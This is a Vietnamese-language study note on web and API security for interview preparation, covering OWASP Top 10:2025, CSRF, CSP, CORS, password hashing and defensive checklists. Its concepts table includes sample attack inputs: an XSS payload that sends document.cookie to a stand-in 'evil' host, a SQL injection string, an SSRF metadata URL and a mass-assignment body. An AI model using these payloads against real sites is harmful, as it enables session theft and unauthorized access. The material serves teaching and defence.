id: 22-web-security
slug: web-security
title: Web & API Security
tier: 6
status: drafted
summary: OWASP Top 10:2025, XSS/CSRF/SQLi/SSRF, IDOR/BOLA, CSP, CORS, secrets, password hashing, supply chain, API security checklist.
cvLinked: true
prerequisites: []
overview: |-
  ## TL;DR

  - Lỗi bảo mật phổ biến nhất ở backend hiện đại **không phải** SQL injection mà là **Broken Access Control** (IDOR/BOLA, thiếu check tenant) — đứng #1 cả OWASP Top 10:2021 lẫn 2025, và API1 trong OWASP API Security Top 10:2023.
  - Tư duy đúng: **mọi input không đáng tin** (body, header, cookie, JWT claim chưa verify, file, URL, webhook), **mọi output phải encode theo context**, **mọi resource phải check quyền ở object level**.
  - Browser security là các cơ chế riêng rẽ, dễ nhầm: **SOP** (chặn đọc cross-origin), **CORS** (nới SOP có kiểm soát — không bảo vệ server), **CSRF** (lợi dụng credential tự gửi kèm), **CSP** (giới hạn script được chạy — lớp phòng thủ thứ hai cho XSS).
  - Defense in depth: validation → parameterized query → authorization → rate limit → logging/alerting → secrets & crypto đúng → supply chain.
  - Senior interview hỏi **tình huống**: key bị lộ, credential stuffing, tenant thấy dữ liệu tenant khác — bạn làm gì trong 1 giờ đầu?

  ## Khái niệm cốt lõi

  | Khái niệm | Một câu | Ví dụ ngắn |
  |---|---|---|
  | XSS | Attacker chèn script chạy trong origin của bạn | `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` trong comment |
  | CSRF | Site khác khiến browser nạn nhân gửi request **kèm cookie** | Form auto-submit `POST /transfer` từ evil.com |
  | SQL injection | Input trở thành một phần của câu SQL | `' OR 1=1 --` trong `WHERE email = '${email}'` |
  | SSRF | Server bị lừa gọi URL do attacker chọn | Webhook URL = `http://169.254.169.254/latest/meta-data/` |
  | IDOR / BOLA | Truy cập object của người khác bằng cách đổi ID | `GET /orders/1043` trả đơn của user khác |
  | Mass assignment | Bind toàn bộ body vào model | `{ "role": "admin" }` trong `PATCH /me` |
  | CSP | Header khai báo nguồn script/style được phép | `script-src 'nonce-r4nd0m' 'strict-dynamic'` |
  | CORS | Server cho phép origin khác **đọc** response | `Access-Control-Allow-Origin: https://app.example.com` |
  | Password hashing | Hàm chậm, có salt, chống brute force | `argon2id` (m=19 MiB, t=2, p=1 theo OWASP) |
  | Envelope encryption | Data key mã hoá dữ liệu, master key (KMS) mã hoá data key | AWS KMS `GenerateDataKey` |

  ## Cơ chế hoạt động

  ### CSRF: tại sao cookie là vấn đề, và các lớp chặn

  ```mermaid
  sequenceDiagram
    participant V as Victim browser
    participant E as evil.example
    participant A as api.shop.com
    V->>A: Login, receives Set-Cookie sid (session)
    V->>E: Visits attacker page
    E-->>V: Auto-submitting form POST api.shop.com/address
    V->>A: POST /address + Cookie sid (browser attaches it)
    Note over A: Defenses checked here
    A->>A: SameSite=Lax blocks cross-site POST cookie
    A->>A: Origin header != allowed origin -> 403
    A->>A: Missing/invalid CSRF token -> 403
    A-->>V: 403 Forbidden
  ```

  ### Request đi qua các lớp phòng thủ của một API

  ```mermaid
  flowchart LR
    R["Request"] --> W["Edge: TLS, WAF,<br/>rate limit per IP"]
    W --> AU["AuthN<br/>verify token/session"]
    AU --> V["Validate input<br/>schema allowlist (zod)"]
    V --> AZ["AuthZ<br/>role + object-level + tenant"]
    AZ --> BL["Business logic<br/>parameterized queries"]
    BL --> O["Output<br/>filter fields, encode"]
    O --> L["Audit log<br/>no secrets / PII"]
  ```

  ### OWASP Top 10:2025 (so với 2021)

  | 2025 | Ghi chú |
  |---|---|
  | A01 Broken Access Control | Vẫn #1; SSRF được gộp vào đây |
  | A02 Security Misconfiguration | Lên từ #5 |
  | A03 Software Supply Chain Failures | Mở rộng từ "Vulnerable and Outdated Components" |
  | A04 Cryptographic Failures | Xuống từ #2 |
  | A05 Injection | Gồm cả XSS |
  | A06 Insecure Design | |
  | A07 Authentication Failures | |
  | A08 Software or Data Integrity Failures | |
  | A09 Security Logging and Alerting Failures | Đổi tên, nhấn mạnh alerting |
  | A10 Mishandling of Exceptional Conditions | Mới: fail-open, lỗi xử lý exception |

  ## Trade-offs

  | Quyết định | Lựa chọn A | Lựa chọn B | Ghi chú |
  |---|---|---|---|
  | Token ở browser | HttpOnly cookie (cần chống CSRF) | `Authorization` header từ JS memory (cần chống XSS) | BFF + cookie thường an toàn nhất cho SPA |
  | CSP | Strict (nonce + `strict-dynamic`) | Allowlist domain | Allowlist dễ bị bypass qua JSONP/CDN chung |
  | Sanitize HTML | Server-side (DOMPurify/jsdom, sanitize-html) | Client-side khi render | Làm cả hai nếu lưu rich text; encode vẫn là mặc định |
  | Rate limit khi hạ tầng lỗi | Fail-open | Fail-closed | Login/OTP → closed; read API → open + alert |
  | Password hash | argon2id | bcrypt | bcrypt vẫn chấp nhận được; chú ý giới hạn 72 byte |
  | Secrets | Env var inject lúc runtime | Secrets manager + short-lived creds | Không bao giờ trong git/image |

  ## Pitfalls

  - Check quyền ở **route** (`requireRole('admin')`) nhưng không check **object thuộc về ai/tenant nào**.
  - `cors({ origin: true, credentials: true })` = mọi site đọc được API bằng cookie của user.
  - Tin `X-Forwarded-For`/`X-Tenant-Id` từ client; `app.set('trust proxy', true)` sai chỗ.
  - `dangerouslySetInnerHTML`, `href={userUrl}` (`javascript:`), nhúng JSON vào `<script>` khi SSR mà không escape `</script>`.
  - Log nguyên `req.body`/header → lộ password, token, PII vào log hệ thống.
  - Hash password bằng SHA-256/MD5 (nhanh = dễ brute force); so sánh token bằng `===` (timing).
  - Validate bằng denylist ("chặn `<script>`") thay vì allowlist schema + output encoding.
  - `npm install` package mới không xem maintainer/`postinstall`; không commit lockfile.

  ## Cheat sheet

  - Headers: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors` (thay `X-Frame-Options`), `Permissions-Policy`; bỏ `X-XSS-Protection` (deprecated).
  - Cookie session: `HttpOnly; Secure; SameSite=Lax; Path=/` + prefix `__Host-`.
  - SQL: luôn parameterized; identifier (cột ORDER BY) → allowlist.
  - AuthZ: deny by default, check object + tenant ở service layer, test cross-tenant.
  - SSRF: allowlist host, resolve DNS rồi chặn private/link-local/metadata IP, không follow redirect mù, IMDSv2.
  - Password: argon2id/bcrypt/scrypt, salt tự sinh, rate limit + breached-password check, MFA.
  - Supply chain: lockfile, `npm ci`, review dependency mới, pin action theo SHA, provenance/SBOM, tắt install scripts khi có thể.
  - Log: structured, redact, correlation id; alert trên pattern tấn công.
